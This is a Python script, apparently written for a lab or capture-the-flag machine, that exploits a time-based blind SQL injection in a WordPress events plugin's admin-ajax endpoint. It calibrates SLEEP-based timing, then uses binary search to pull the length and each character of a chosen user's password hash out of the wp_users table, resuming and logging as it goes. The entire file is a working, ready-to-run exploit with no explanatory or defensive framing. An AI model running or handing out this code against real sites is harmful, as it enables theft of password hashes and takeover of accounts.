#!/usr/bin/env python3
import requests,time,statistics,os,sys,argparse
ap=argparse.ArgumentParser()
ap.add_argument('--id',type=int,required=True)
ap.add_argument('--out',required=True)
ap.add_argument('--log',required=True)
ap.add_argument('--ip',default='10.66.152.69')
ap.add_argument('--sleep',type=int,default=2)
ap.add_argument('--maxlen',type=int,default=60)
args=ap.parse_args()

BASE=f'http://{args.ip}/wordpress/wp-admin/admin-ajax.php'

def log(msg):
    ts=time.strftime('%H:%M:%S')
    line=f'[{ts}] {msg}'
    print(line, flush=True)
    with open(args.log,'a') as f: f.write(line+'\n')

def rq(s,cond):
    payload=f"2) AND (SELECT 3055 FROM (SELECT(IF(({cond}),SLEEP({args.sleep}),0)))UlqC) AND (2258=2258"
    t=time.time(); r=s.get(BASE,params={'action':'mec_load_single_page','time':payload},timeout=12)
    return r.status_code,time.time()-t

def health(s):
    try: return s.get(f'http://{args.ip}/',timeout=4).status_code==200
    except Exception: return False

open(args.log,'a').close(); log(f'extractor loop start id={args.id}')
while True:
    s=requests.Session()
    if not health(s):
        log('target down, sleep 5'); time.sleep(5); continue
    try:
        tr=[]; fa=[]
        for _ in range(2): tr.append(rq(s,'1=1')[1]); fa.append(rq(s,'1=0')[1])
        thr=(statistics.median(tr)+statistics.median(fa))/2
        log(f'calibration thr={thr:.3f} true={tr} false={fa}')
    except Exception as e:
        log(f'calibration error: {e}'); time.sleep(3); continue

    def is_true(cond):
        for _ in range(2):
            try:
                c,dt=rq(s,cond)
                if c in (200,500): return dt>thr
            except Exception:
                pass
            time.sleep(0.3)
        return None

    res=''
    if os.path.exists(args.out): res=open(args.out).read().strip()
    log(f'resume len={len(res)} val={res!r}')

    lo,hi=1,args.maxlen; ok=True
    while lo<=hi:
        if not health(s): ok=False; break
        m=(lo+hi)//2
        v=is_true(f"LENGTH((SELECT user_pass FROM wordpress.wp_users WHERE ID={args.id}))>{m}")
        if v is None: ok=False; break
        if v: lo=m+1
        else: hi=m-1
    if not ok:
        log('len probe interrupted; retry loop'); time.sleep(2); continue
    L=lo; log(f'inferred length={L}')

    if len(res)>=L and L>1:
        log(f'complete hash present: {res}'); print(res); sys.exit(0)

    failed=False
    for pos in range(len(res)+1, L+1):
        if not health(s): log(f'down at pos {pos}'); failed=True; break
        l,r=32,126
        while l<=r:
            m=(l+r)//2
            v=is_true(f"ASCII(SUBSTRING((SELECT user_pass FROM wordpress.wp_users WHERE ID={args.id}),{pos},1))>{m}")
            if v is None: failed=True; break
            if v: l=m+1
            else: r=m-1
        if failed: break
        ch=chr(l); res+=ch
        with open(args.out,'w') as f: f.write(res)
        log(f'pos {pos}: {ch} => {res}')

    if failed:
        log('interrupted during extraction; retrying'); time.sleep(2); continue
    log(f'DONE {res}'); print(res); sys.exit(0)
